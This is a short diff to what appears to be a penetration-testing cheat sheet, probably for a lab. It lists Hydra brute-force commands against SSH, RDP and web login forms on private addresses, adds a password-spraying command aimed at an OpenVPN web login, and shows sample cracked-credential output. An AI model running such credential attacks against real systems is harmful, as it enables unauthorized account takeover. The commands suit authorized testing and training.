@@ -12,6 +12,9 @@ hydra -L users.txt -P passwords.txt ssh://172.25.170.X
 hydra -L users.txt -P passwords.txt rdp://172.25.170.X
 🔥 HTTP LOGIN FORM
 hydra -L users.txt -P passwords.txt 172.25.170.X http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+
+hydra -L Usernames.txt -p test 172.25.120.2 -s 943 https-post-form "/__auth__:username=^USER^&password=^PASS^:Login Failed" -S -vV -t 1  (openVPN)
+    
 🧠 OUTPUT (IMPORTANT)
 [22][ssh] host: 172.25.170.X login: admin password: password123
 
